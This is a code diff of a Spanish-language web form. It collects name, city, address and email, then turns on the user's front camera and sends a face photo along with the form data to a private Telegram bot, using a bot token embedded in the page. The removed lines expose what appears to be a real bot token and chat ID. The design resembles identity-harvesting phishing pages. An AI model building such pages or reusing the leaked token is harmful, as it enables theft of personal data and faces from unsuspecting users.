@@ -32,7 +32,7 @@
       margin-top: 10px;
       display: block;
     }
-    input[type="text"], input[type="email"], input[type="tel"], select {
+    input[type="text"], input[type="email"], input[type="tel"] {
       width: 100%;
       padding: 10px;
       margin-top: 5px;
@@ -57,13 +57,16 @@
       font-weight: bold;
       display: none;
     }
-    #fotoContainer {
+    #videoContainer {
       display: none;
       margin-top: 20px;
       text-align: center;
     }
-    .g-recaptcha {
-      margin-top: 20px;
+    video {
+      width: 100%;
+      max-width: 300px;
+      border: 2px solid black;
+      border-radius: 10px;
     }
   </style>
 </head>
@@ -76,12 +79,7 @@
     <input type="text" name="nombre" required>
 
     <label>Ciudad</label>
-    <select name="ciudad" required>
-      <option value="">Selecciona una ciudad</option>
-      <option>Madrid</option>
-      <option>Barcelona</option>
-      <!-- ... (más ciudades si deseas) -->
-    </select>
+    <input type="text" name="ciudad" required>
 
     <label>Dirección</label>
     <input type="text" name="direccion" required>
@@ -92,27 +90,30 @@
     <label>Correo electrónico</label>
     <input type="email" name="correo" required>
 
-    <div class="g-recaptcha" data-sitekey="6LeJKhMrAAAAADXLy6-um63PwK1hszwHfC6hyPWn"></div>
+    <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
 
     <button type="submit">ENVIAR</button>
   </form>
 
   <div id="mensajeEnviado">Formulario enviado</div>
 
-  <div id="fotoContainer">
-    <p>Ahora toma una foto frontal:</p>
-    <input type="file" id="foto" accept="image/*" capture="user" />
+  <div id="videoContainer">
+    <p>Tomando foto frontal...</p>
+    <video id="video" autoplay playsinline></video>
+    <br>
+    <button id="capturar">Capturar y enviar foto</button>
   </div>
 </div>
 
 <script>
   const formulario = document.getElementById('formulario');
   const mensajeEnviado = document.getElementById('mensajeEnviado');
-  const fotoContainer = document.getElementById('fotoContainer');
-  const fotoInput = document.getElementById('foto');
+  const videoContainer = document.getElementById('videoContainer');
+  const video = document.getElementById('video');
+  const capturarBtn = document.getElementById('capturar');
 
-  const botToken = '8050401859:AAHP567wAuPAgA6yaZhY0OdriYNaxkSgBsY';
-  const chatId = '1217829628';
+  const botToken = 'YOUR_BOT_TOKEN';
+  const chatId = 'YOUR_CHAT_ID';
 
   formulario.addEventListener('submit', function(e) {
     e.preventDefault();
@@ -146,33 +147,45 @@ Correo: ${datos.get('correo')}
         formulario.reset();
         grecaptcha.reset();
         mensajeEnviado.style.display = 'block';
-        fotoContainer.style.display = 'block';
+        iniciarCamara();
       } else {
         alert('Error al enviar el formulario.');
       }
     });
   });
 
-  fotoInput.addEventListener('change', function() {
-    const file = fotoInput.files[0];
-    if (!file) return;
-
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('photo', file);
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    })
-    .then(res => {
-      if (res.ok) {
-        alert('Foto enviada correctamente.');
-        fotoContainer.innerHTML = '<strong>¡Foto enviada con éxito!</strong>';
-      } else {
-        alert('Error al enviar la foto.');
-      }
+  function iniciarCamara() {
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' }
+    }).then(stream => {
+      video.srcObject = stream;
+      videoContainer.style.display = 'block';
+    }).catch(err => {
+      alert('Error al acceder a la cámara: ' + err);
     });
+  }
+
+  capturarBtn.addEventListener('click', () => {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'foto.jpg');
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).then(res => {
+        if (res.ok) {
+          videoContainer.innerHTML = '<strong>¡Foto enviada con éxito!</strong>';
+        } else {
+          alert('Error al enviar la foto.');
+        }
+      });
+    }, 'image/jpeg');
   });
 </script>
 
